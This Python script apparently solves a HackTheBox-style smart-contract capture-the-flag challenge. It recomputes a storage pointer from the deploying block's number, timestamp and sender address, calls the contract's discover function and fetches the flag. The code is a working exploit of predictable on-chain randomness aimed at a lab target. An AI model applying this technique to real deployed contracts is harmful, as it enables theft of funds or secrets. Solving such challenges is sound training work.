#!/usr/bin/env python3

import json
from pwn import remote, context, args
from web3 import Web3
from eth_abi.packed import encode_packed

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    player_addr = connection_info['Player Address']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    
    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")

    with open ("contracts/out/Setup.sol/Setup.json", "r") as f:
        setup_abi = json.load(f)["abi"]
    with open ("contracts/out/ForgottenArtifact.sol/ForgottenArtifact.json", "r") as f:
        target_abi = json.load(f)["abi"]
    ForgottenArtifact = w3.eth.contract(address=target_addr, abi=target_abi)
    Setup = w3.eth.contract(address=setup_addr, abi=setup_abi)

    print(f"[*] Retrieving artifact origin transaction")
    logs = Setup.events.DeployedTarget.get_logs(from_block=0)
    deployed_log = logs[0]
    origin_tx = deployed_log["transactionHash"].hex()
    print(f"[*] Origin transaction: {origin_tx} @ block {deployed_log['blockNumber']}")
    print(f"[*] Retrieving block informations")
    origin_block = w3.eth.get_block(deployed_log["blockNumber"])
    print(f"[*] Block informations: {origin_block}")
    block_number = origin_block["number"]
    block_timestamp = origin_block["timestamp"]
    print(f"[*] Block number: {deployed_log['blockNumber']}, timestamp: {block_timestamp}, msg.sender: {setup_addr}")
    seed = w3.keccak(encode_packed(["uint", "uint", "address"], [deployed_log["blockNumber"], block_timestamp, setup_addr]))
    print(f"[*] Artifact storage pointer location: 0x{seed.hex()}")
    print(f"[*] Discovering artifact")
    ForgottenArtifact.functions.discover(seed).transact()

    # get flag
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    